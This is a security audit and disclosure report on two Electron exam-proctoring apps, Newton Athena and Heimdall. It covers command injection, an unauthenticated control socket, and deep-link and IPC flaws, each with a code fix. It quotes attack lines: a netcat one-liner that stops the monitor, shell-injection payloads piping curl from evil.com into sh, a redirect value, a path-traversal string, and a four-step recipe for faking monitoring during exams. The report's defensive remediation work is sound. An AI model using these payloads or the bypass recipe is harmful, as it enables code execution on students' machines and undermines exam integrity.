# Responsible Security Disclosure — Newton Athena & Heimdall
### Prepared for: Newton School Engineering Team
### Date: 2026-08-26
### Severity Overview: 8 High/Critical · 6 Medium · 5 Low · 19 total findings

---

## Executive Summary

A static security audit of the two shipped macOS Electron apps — **Newton Athena** (v0.0.89, Electron 37.4.0) and **Heimdall** (v1.0.4, Electron 36.2.0) — uncovered **19 security issues**, 8 of which are High or Critical severity. The apps face an unusually hostile threat model: the end user (a test-taker) is a local adversary with full control of their own Mac who is motivated to defeat proctoring.

The most important finding is this: **as shipped today, any student can turn off the Heimdall monitor, fake monitoring signals to Athena, and redirect or tamper with uploaded proctoring evidence — all without touching the app binary.** Additionally, a student who visits a crafted web page while Athena is installed could have arbitrary software silently downloaded and opened on their machine.

This report gives you:
1. Every finding with severity, exact file/line, and a working code fix
2. A prioritized remediation plan
3. A test suite to verify both the vulnerability and the fix
4. Two hardened reference builds (`athena-patch`, `heimdall-patch`) you can run today

---

## Security Ratings

| App | Rating | Summary |
|-----|:------:|---------|
| **Newton Athena** | **4.5 / 10** | Good baseline hygiene undermined by command injection, an unauthenticated Heimdall trust channel, and a deep-link path that loads arbitrary web origins into a privileged window |
| **Heimdall** | **4 / 10** | World-writable, unauthenticated control socket lets any local process stop the monitor or redirect all proctoring uploads |
| **Program Overall** | **4.5 / 10** | No hardcoded secrets or cleartext traffic, but several locally-exploitable flaws that are serious given the anti-cheat threat model |

---

## How the Audit Was Done

Both apps ship as compiled Electron bundles. The `app.asar` archive is a plain, unencrypted container — it unpacks in seconds. Both apps **ship production source maps** (`*.js.map`) inside the bundle, which reconstruct the original TypeScript source, including comments. Using these, the full source of `src/main/main.ts`, `cheatingUtils.ts`, the socket protocol, and all IPC handlers was recovered verbatim. This is itself a finding (see BUG-19 / RE §1).

---

## Part 1 — Critical & High Severity Findings

---

### 🔴 BUG-1 (H1) — Control Socket is World-Writable and Unauthenticated
**Severity: Critical** | **App: Heimdall**

**Files:**
- `src/main/common/constants.ts` — `SOCKET_PATH = /tmp/heimdall.sock`
- `src/main/core/socketServer.ts` — `fs.chmodSync(this.socketPath, 0o777)`
- `src/main/core/index.ts` — `onDataCB` (processes all incoming commands)

**What's broken:**
Heimdall opens a UNIX domain socket at a fixed, predictable path in a world-writable directory (`/tmp`) and then makes it accessible by every user and process on the machine (`chmod 0o777`). There is no authentication, handshake, or peer check on connections.

Any process on the machine (a script a student runs during an exam) can connect and send:
- `{"type":"STOP_HEIMDALL"}` → Heimdall calls `app.quit()` — **proctoring stops instantly**
- `{"type":"SET_HEIMDALL_ON_QUIT_HANDLER"}` + `{"type":"TRANSPORT_OBJECT","data":{"url":"https://evil.com",...}}` → redirects where proctoring data is uploaded
- `{"type":"ACTIVE_TIMESTAMP"}` → manipulates the auto-quit timer

A student can also **squat** the socket before Athena connects, so Athena can never attach — a silent denial-of-service of monitoring.

**One-liner exploit (any student during an exam):**
```bash
echo '{"type":"STOP_HEIMDALL"}' | nc -U /tmp/heimdall.sock
```
Heimdall quits. The exam continues. The server believes monitoring is active.

**Fix:**
```diff
# constants.ts
- export const SOCKET_PATH = `/tmp/heimdall.sock`;
+ export const SOCKET_PATH = path.join(app.getPath('userData'), 'heimdall.sock');

# socketServer.ts
- fs.chmodSync(this.socketPath, 0o777);
+ fs.chmodSync(this.socketPath, 0o600); // owner-only

# index.ts — add auth gate before processing any command
+ if (!peer.authenticated) return; // drop everything until handshake completes
  switch (data.type) { case 'STOP_HEIMDALL': app.quit(); ... }
```
Add a per-session HMAC challenge-response handshake (see Part 3 — Cross-cutting hardening).

---

### 🔴 BUG-2 (H2) — Arbitrary HTTP Request from Attacker-Controlled Persisted Config
**Severity: High** | **App: Heimdall**

**File:** `src/main/core/index.ts` → `sendProctoredLogDataToServer()`

**What's broken:**
On startup, Heimdall reads `proctor-data.json` (stored in the user-writable `userData` directory) and makes a fully attacker-shaped HTTP request:
```ts
const { method, data, headers, url } = proctorData; // from proctor-data.json
const response = await fetch(url, { body: JSON.stringify(data), method, headers });
```
This file is written from socket commands (BUG-1). An attacker sets the URL, method, headers, and body — directing your proctoring evidence to `https://attacker.com` instead of your servers.

**Fix:**
```diff
- const { method, data, headers, url } = proctorData;
- const response = await fetch(url, { body: JSON.stringify(data), method, headers });
+ // Never trust a persisted URL. Always send to the hardcoded endpoint.
+ const UPLOAD_URL = 'https://my.newtonschool.co/api/v1/proctor/upload/';
+ const response = await fetch(UPLOAD_URL, {
+   method: 'POST',
+   body: JSON.stringify(data),
+   headers: { 'Content-Type': 'application/json', ...yourAuthHeaders }
+ });
```

---

### 🔴 BUG-3 (H3) — Shell Command Injection via Deep Link URL
**Severity: High** | **App: Heimdall**

**File:** `src/main/systems.ts` → `openPlatformApp()`, reachable via IPC `open_platform_app_deeplink_url`

**What's broken:**
```ts
exec(`open "${data.deeplinkURL}&launched_by_heimdall=true"`);
```
`data.deeplinkURL` comes from `shared-data.json` (user-writable). Wrapping in double quotes does **not** neutralize `"`, backticks, or `$()`. A `deeplinkURL` of `"; curl https://evil.com/x | sh; "` yields arbitrary shell execution.

**Fix:**
```diff
- exec(`open "${data.deeplinkURL}&launched_by_heimdall=true"`);
+ const u = new URL(data.deeplinkURL);
+ if (u.protocol !== 'newton-athena:') throw new Error('bad scheme');
+ execFile('open', [`${u.toString()}&launched_by_heimdall=true`]); // no shell
```

---

### 🔴 BUG-4 (H4) — Preload Exposes Raw `ipcRenderer` to the Renderer
**Severity: High** | **App: Heimdall**

**File:** `dist/main/preload.js`

**What's broken:**
```js
contextBridge.exposeInMainWorld("electron", {
  ipcRenderer: {
    sendMessage(channel, ...args) { ipcRenderer.send(channel, ...args) },
    invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),
  }
});
```
Any script in the renderer can call **any IPC channel with any arguments**. This is the amplifier that makes BUG-3, BUG-5, and BUG-6 reachable from a web page rather than requiring local code execution.

**Fix:**
```diff
- contextBridge.exposeInMainWorld('electron', { ipcRenderer: { sendMessage, on, once, invoke } });
+ contextBridge.exposeInMainWorld('heimdall', {
+   reportStatus: () => ipcRenderer.invoke('heimdall:report-status'),
+   // Only expose exactly the operations the renderer legitimately needs.
+   // No caller-supplied channel names, ever.
+ });
```

---

### 🔴 BUG-8 (A1) — Command Injection + Broken Kill via `pkill -15 ${proc}`
**Severity: High** | **App: Newton Athena**

**File:** `src/utils/cheatingUtils.ts` → `killUserLaunchedProcesses()`

**What's broken:**
```ts
exec(`pkill -15 ${proc}`, execOptions, () => res());
```
`proc` is a process **display name** obtained from `osascript`. A student can launch an app with a crafted name containing shell metacharacters. For example, an app named `` x`curl evil|sh` `` causes Athena to execute that shell payload while attempting to kill "restricted apps."

This also has a **functional bug**: app names with spaces (e.g. `Google Chrome`) are split into multiple pkill patterns, so the kill silently fails.

**Fix:**
```diff
- exec(`pkill -15 ${proc}`, execOptions, () => res());
+ if (!/^[\w .-]{1,64}$/.test(proc)) return res(); // reject unexpected characters
+ execFile('pkill', ['-15', '-x', proc], () => res()); // no shell; exact match; handles spaces
```

---

### 🔴 BUG-9 (A2) — Deep Link Loads Attacker-Chosen Origin into Privileged Window
**Severity: High** | **App: Newton Athena**

**File:** `src/main/main.ts` → `handleOpenURL()` / `initStepsBeforeCreatingWindowFromURL()`

**What's broken:**
```ts
rawTestURL = `https://${testURL.host}${testURL.pathname}${testURL.search}`;
// ↑ testURL.host is whatever the deep link says — no allowlist
void testWindow.loadURL(resolveHtmlPath(`update/?redirectURL=${encodeURIComponent(rawTestURL)}`));
```
A malicious website can fire `newton-athena://evil.com/...` and load `https://evil.com` inside `testWindow`. That window has the full preload bridge, so the attacker page can then call: `downloadHeimdall(anyURL)`, `openShutdownSettings()` (reboot), `disableKioskMode()`, `killUserLaunchedApplications()`, `sendFileUploadConfig()`. The `authToken` is also read straight from the deep-link query string.

**Fix:**
```diff
+ const ALLOWED = /(^|\.)newtonschool\.co$/i;
+ if (!ALLOWED.test(testURL.hostname)) {
+   log('REJECTED deep link — non-allowlisted host:', testURL.hostname);
+   return;
+ }
  rawTestURL = `https://${testURL.host}${testURL.pathname}${testURL.search}`;
- const authToken = params.get('authToken'); // ← remove; obtain server-side only
```

---

### 🔴 BUG-10 (A3) — `DOWNLOAD_HEIMDALL` Downloads and Opens a Renderer-Supplied DMG
**Severity: High** | **App: Newton Athena**

**File:** `src/main/main.ts` → IPC handler `DOWNLOAD_HEIMDALL`

**What's broken:**
```ts
const downloadedItem = await download(win, dmgUrl, { directory: app.getPath('downloads') });
const openResult = await shell.openPath(downloadedItem.getSavePath()); // mounts and runs the DMG
```
`dmgUrl` is supplied by the renderer with no domain check and no hash/signature verification. Combined with BUG-9, a hostile page can make Athena fetch and silently open an arbitrary `.dmg` — a direct path to installing malware on the student's Mac.

**Fix:**
```diff
+ const u = new URL(dmgUrl);
+ if (u.protocol !== 'https:' || !/(^|\.)newtonschool\.co$/i.test(u.hostname)) {
+   throw new Error('untrusted DMG source');
+ }
  const f = await download(win, u.toString(), { directory: app.getPath('downloads') });
+ await verifyCodeSignatureOrPinnedSha256(f.getSavePath()); // verify BEFORE opening
  shell.openPath(f.getSavePath());
```

---

### 🔴 BUG-11 (A4) — Command Injection via `--heimdall-versions=${…}`
**Severity: High** | **App: Newton Athena**

**File:** `src/main/main.ts` → IPC `OPEN_HEIMDALL` (~line 1053)

**What's broken:**
```ts
heimdallVersions = userDetails.heimdall_versions ?? []; // from /api/v1/user/me/
exec(`open /Applications/Heimdall.app --args --heimdall-versions=${heimdallVersions.join(',')}`);
```
Server-returned data is interpolated directly into a shell string. A compromised or rogue backend response becomes arbitrary command execution on the student's machine.

**Fix:**
```diff
- exec(`open /Applications/Heimdall.app --args --heimdall-versions=${heimdallVersions.join(',')}`);
+ const v = heimdallVersions.join(',');
+ if (!/^[0-9x.,]+$/.test(v)) throw new Error('bad version string');
+ execFile('open', ['/Applications/Heimdall.app', '--args', `--heimdall-versions=${v}`]);
```

---

## Part 2 — Medium Severity Findings

---

### 🟠 BUG-5 (H5) — `shell.openExternal` with Renderer-Controlled URL
**Severity: Medium** | **App: Heimdall**

**Files:** `src/main/systems.ts` → `openSystemPreference()`; `src/main/main.ts` → `setWindowOpenHandler`

The renderer can pass any string to `shell.openExternal`. Hostile schemes (`file://`, `smb://`, custom app schemes) can trigger other apps, exfiltrate SMB credentials, or aid phishing.

**Fix:** Allowlist to `https:` and the specific `x-apple.systempreferences:` values you use:
```ts
const ALLOWED_SCHEMES = ['https:', 'x-apple.systempreferences:'];
if (!ALLOWED_SCHEMES.includes(new URL(url).protocol)) return;
shell.openExternal(url);
```

---

### 🟠 BUG-6 (H6) — Path Traversal via `snapshotType`
**Severity: Medium** | **App: Heimdall**

**File:** `src/main/core/snapshotCache.ts` → `getSnapshotCacheDir()`

```ts
path.join(app.getPath('userData'), 'cached-data', snapshotType) // snapshotType from renderer
```
A `snapshotType` of `../../Library/Keychains/` escapes the cache directory.

**Fix:**
```ts
const ALLOWED = new Set(['webcam', 'screen', 'combined']);
if (!ALLOWED.has(snapshotType)) throw new Error('invalid snapshot type');
const root = path.resolve(baseDir, 'cached-data');
const dir = path.resolve(root, snapshotType);
if (!dir.startsWith(root + path.sep)) throw new Error('path escape blocked');
```

---

### 🟠 BUG-12 (A5) — Renderer Controls Proctoring Upload Destination
**Severity: Medium-High** | **App: Newton Athena**

**File:** `src/main/main.ts` → IPC `SEND_PROCTORED_LOG…` and `DATA_UPLOAD_CONFIG`

```ts
url: `${API_ENDPOINTS.BASE_URL}${data?.requestURL}`, // data.requestURL from renderer
```
`data.requestURL = "@evil.com/x"` makes the effective host `evil.com` (`https://my.newtonschool.co@evil.com/x`). Proctoring video and screenshots can be silently redirected to an attacker server.

**Fix:**
```ts
const u = new URL(data?.requestURL ?? '', API_ENDPOINTS.BASE_URL);
if (u.protocol !== 'https:' || !/(^|\.)newtonschool\.co$/i.test(u.hostname)) {
  throw new Error('bad upload host');
}
```

---

### 🟠 BUG-13 (A6) — `webSecurity: false` on Two Windows
**Severity: Medium** | **App: Newton Athena**

**File:** `src/main/main.ts` lines **349** & **361** (`screenShareWindow`, `webCamWindow`)

Disabling `webSecurity` turns off the same-origin policy for those renderers (which also load a preload). The code comment says "remove once heimdall is adopted" — it has not been removed.

**Fix:** Remove `webSecurity: false`. Use a `setPermissionRequestHandler` allowlist for `media` instead.

---

### 🟠 BUG-14 (A7) — Powerful OS Actions Exposed Over IPC Without Guards
**Severity: Medium** | **App: Newton Athena**

**File:** `src/main/main.ts`

IPC handlers `OPEN_SHUTDOWN_SETTINGS` (runs `osascript "shutdown -r now"`), `DISABLE_KIOSK_MODE`, `KILLALL_RESTRICTED_APPLICATIONS_RELAUNCH_APP`, and `STOP_PROCTORING` are reachable from any renderer content. Combined with BUG-9, a malicious web page can reboot a student's computer mid-exam.

**Fix:** Gate every state-changing IPC on a first-party-origin check:
```ts
ipcMain.handle('OPEN_SHUTDOWN_SETTINGS', (event) => {
  const origin = new URL(event.senderFrame.url).hostname;
  if (!/(^|\.)newtonschool\.co$/i.test(origin)) throw new Error('unauthorized');
  // ... proceed
});
```

---

## Part 3 — Low Severity Findings

---

### 🟡 BUG-15 (A8) — Non-Cryptographic `Math.random()` for Session UUIDs
**Severity: Low** | **App: Newton Athena** | **File:** `src/utils/cryptoUtils.ts`

```diff
- return Math.random().toString(36)... // predictable, not unique
+ return crypto.randomUUID(); // Node ≥ 14.17, available in Electron
```

---

### 🟡 BUG-16 — `will-navigate` Checks Host Only, Not Full Origin
**Severity: Low** | **App: Newton Athena** | **File:** `src/main/main.ts`

```diff
- if (newURL.host !== testURL.host) event.preventDefault();
+ if (newURL.protocol !== 'https:' || newURL.origin !== testURL.origin) event.preventDefault();
```

---

### 🟡 BUG-17 (X1) — No Explicit Window Hardening + Weak CSP
**Severity: Low** | **Both Apps**

No `BrowserWindow` explicitly sets `contextIsolation`, `sandbox`, or `nodeIntegration`. The defaults are currently secure in Electron 36/37, but this silently depends on defaults — one config change away from a regression.

CSP in `dist/renderer/index.html` is `script-src 'self' 'unsafe-inline'` — no `default-src`, `object-src`, `base-uri`, or `connect-src`. `'unsafe-inline'` weakens XSS protection.

**Fix for every BrowserWindow:**
```ts
webPreferences: {
  contextIsolation: true,
  sandbox: true,
  nodeIntegration: false,
  webSecurity: true,
}
```
**Fix for CSP:**
```
default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:;
connect-src 'self' https://*.newtonschool.co; object-src 'none'; base-uri 'none';
```

---

### 🟡 BUG-18 (X2) — Sensitive Data Written to Disk Logs
**Severity: Low** | **Both Apps**

- Athena: `log.info('Received URL:', url)` — logs full deep-link URLs containing `authToken`
- Heimdall: `log.info('launch arguments', process.argv)` — logs argv including secrets
- Both: `Sentry.setUser(userDetails)` — ships PII to Sentry

`electron-log` persists to disk on the (untrusted) student machine. Anyone who reads the log file gets the auth token.

**Fix:** Redact before logging:
```ts
const safeUrl = url.replace(/authToken=[^&]+/, 'authToken=[REDACTED]');
log.info('Received URL:', safeUrl);
```

---

### 🟡 BUG-19 — Inverted SIP Enforcement Logic
**Severity: Low** | **App: Newton Athena** | **File:** `src/utils/cheatingUtils.ts`

```ts
// Current (wrong):
return enableSIPCheck ? true : systemDetectedSIPValue;
// When SIP check is ENABLED → always returns true (SIP "on") regardless of actual system state.
// A student with SIP DISABLED — the ideal tampering platform — passes right through.

// Correct:
return enableSIPCheck ? systemDetectedSIPValue : true;
```

---

### 🟡 BUG-7 — Unsafe Non-Null Assertion on `mainWindow` in Updater Events
**Severity: Low** | **App: Heimdall** | **File:** `src/main/main.ts`

```diff
- mainWindow!.webContents.send('download-progress', info);
+ if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('download-progress', info);
```

---

## Part 4 — The Fake-Monitoring Attack (Most Important)

This deserves its own section because it is the most direct threat to exam integrity.

### How a student fakes full monitoring today (4 steps)

1. **Stop the real Heimdall** by sending `{"type":"STOP_HEIMDALL"}` to `/tmp/heimdall.sock` (or prevent it from starting by squatting the socket)
2. **Run a dummy process named `Heimdall`** — Athena checks `osascript "exists process 'Heimdall'"` and this passes
3. **Bind their own listener** at `/tmp/heimdall.sock` that emits the plaintext string `HEIMDALL_ACTIVE` every 2 seconds (the exact protocol is in the shipped source maps)
4. **Start the exam** — Athena reports "monitored" to your server. Nothing records.

The student knows the exact heartbeat string, timing constants, and socket protocol from reading the shipped source maps.

### How to fix this permanently

The root fix is **moving the trust decision server-side**:

```
                   Today (broken)           After fix
                   ──────────────           ──────────
Athena decides:    "Heimdall said ACTIVE"   Server decides based on signed evidence
Heimdall proves:   nothing                  HMAC-signed heartbeat using server-issued secret
Server validates:  nothing                  Rejects sessions with missing/invalid heartbeat data
```

Concretely:
1. On session start, your server issues a random 32-byte secret and delivers it to **both** Athena and the real Heimdall over HTTPS (not through the socket)
2. Heimdall signs every heartbeat: `HMAC-SHA256(secret, "hb:" + timestamp + ":" + nonce)`
3. Athena only marks itself as "monitored" while receiving fresh, correctly-signed, non-replayed heartbeats
4. A fake monitor can't forge a valid HMAC without the secret
5. Your server independently confirms the session is valid by checking received evidence (frames + heartbeat tokens)

This is implemented and working in the provided `athena-patch/` and `heimdall-patch/` reference builds. Run `node verify-patch-channel.js` to see it in action.

---

## Part 5 — Additional Attacker Capabilities (Reverse Engineering)

Because **production source maps ship inside `app.asar`**, an attacker gets your full TypeScript source, comments, timing constants, and protocol details for free. This enables:

- **Timing attacks**: Poll intervals (30s), heartbeat windows (900,000ms deeplink freshness), and all detection thresholds are visible — a student times around them exactly
- **Env-flag bypass**: `NODE_ENV=development` enables the dev app allowlist (Electron, Terminal, Slack) and HTTP URLs. If the packaged app reads `process.env.NODE_ENV`, a student can set it
- **Direct patching**: `app.asar` can be repacked in under a minute to patch any function — e.g., make `isSIPEnabled()` always return `true`, or make `killUserLaunchedProcesses()` a no-op

**Fix:** Don't ship source maps. Upload them to Sentry via `sentry-cli` and exclude `*.map` from the `app.asar` package. Enable Electron fuses to block `--inspect`, `NODE_OPTIONS`, and `node .` mode on the packaged binary:
```js
// scripts/afterPack.js (electron-builder hook)
await flipFuses(electronBinary, {
  [FuseV1Options.RunAsNode]: false,
  [FuseV1Options.EnableNodeOptionsEnvironmentVariable]: false,
  [FuseV1Options.EnableNodeCliInspectArguments]: false,
  [FuseV1Options.EnableEmbeddedAsarIntegrityValidation]: true,
  [FuseV1Options.OnlyLoadAppFromAsar]: true,
});
```

---

## Part 6 — Prioritized Remediation Roadmap

### Fix immediately (blocks shipping)

| Priority | Bug | Effort | Impact |
|----------|-----|--------|--------|
| 1 | **BUG-1** — Lock down the Heimdall socket | Low | Kills the instant monitor-kill attack |
| 2 | **BUG-8, BUG-3, BUG-11** — Replace all `exec(string)` with `execFile(cmd, [args])` | Low | Eliminates all command injection |
| 3 | **BUG-9** — Enforce deep-link host allowlist | Low | Closes the web-to-privileged-window attack |
| 4 | **BUG-10** — Pin Heimdall download origin + verify signature | Low | Closes drive-by malware install |
| 5 | **BUG-12, BUG-2** — Allowlist all upload/report hosts | Low | Prevents proctoring data exfiltration |
| 6 | **BUG-4** — Replace raw `ipcRenderer` bridge with named API | Medium | Removes amplifier for all renderer-reachable attacks |

### Fix before next release (medium priority)

| Priority | Bug | Notes |
|----------|-----|-------|
| 7 | **BUG-5** — `shell.openExternal` allowlist | Prevents hostile protocol launches |
| 8 | **BUG-6** — `snapshotType` path traversal | Prevents cache escape |
| 9 | **BUG-13** — Remove `webSecurity: false` | Use permission handlers for camera/screen |
| 10 | **BUG-14** — Gate OS-action IPC on first-party origin | Prevents reboot/kiosk-off from web content |
| 11 | **BUG-19** — Fix inverted SIP logic | SIP-off machines currently bypass the check |

### Hygiene (low priority)

| Bug | Fix |
|-----|-----|
| BUG-15 | `crypto.randomUUID()` instead of `Math.random()` |
| BUG-16 | Compare full origin (not just host) in `will-navigate` |
| BUG-17 | Explicit window hardening + strict CSP |
| BUG-18 | Redact auth tokens from logs |
| BUG-7 | Guard `mainWindow!` null assertion |

### Architecture-level (for high-stakes exams)

- Move "session is monitored" verdict server-side — based on signed, live evidence, not a client boolean
- Add per-frame server nonces/watermarks to camera captures to detect virtual-camera replay
- Randomize and make continuous the restricted-app detection (currently 30s polling, stops after first hit)
- Strip source maps from packaged builds; enable all Electron fuses

---

## Part 7 — Verification

Two test suites are provided that can be run without any installs or network access:

```bash
# End-to-end proof of the hardened trust channel (pure Node, no Electron):
node verify-patch-channel.js
# → PASS  valid client monitored | wrong secret rejected | unauth STOP ignored | socket 0600

# Automated security regression suite (Node ≥ 18, no deps):
cd security-tests
npm test                # Current build → ~25 FAIL (each = confirmed vulnerability)
npm run test:hardened   # Hardened modules → 14 PASS (each = fix confirmed working)
```

The `security-tests/MAPPING.md` maps every test to a Bug ID, source file, and line number.

---

## Part 8 — What's Done Well

It is important to note that the codebase has a good foundation. These are the things that are already right and should be preserved:

- ✅ **No hardcoded secrets, API keys, or private keys** anywhere in either bundle
- ✅ **All traffic is HTTPS** — `https://my.newtonschool.co`; no cleartext, no `rejectUnauthorized: false`
- ✅ **Modern Electron** (37.4.0 / 36.2.0) — recent Chromium patches and secure default `webPreferences`
- ✅ **No dangerous patterns** — no `eval()`, `new Function()`, `dangerouslySetInnerHTML`, or remote module usage
- ✅ **Athena's preload uses a well-scoped contextBridge** — the named API surface is good; Heimdall's is the problem
- ✅ **Auto-update uses electron-updater over HTTPS S3 with macOS code-signing** — update integrity is sound
- ✅ **Sentry scrubs password fields** (`password="%filtered%"`)
- ✅ **`will-navigate` partially guards navigation** (needs the origin-scope fix from BUG-16)
---

*This report is based on static analysis of the shipped source maps. Dynamic testing (running the apps and exercising the socket, deep links, and IPC under controlled conditions) is recommended to confirm exploitability and measure attacker effort before release. All findings were identified on 2026-08-25 and reported to the Newton School engineering team via responsible disclosure.*
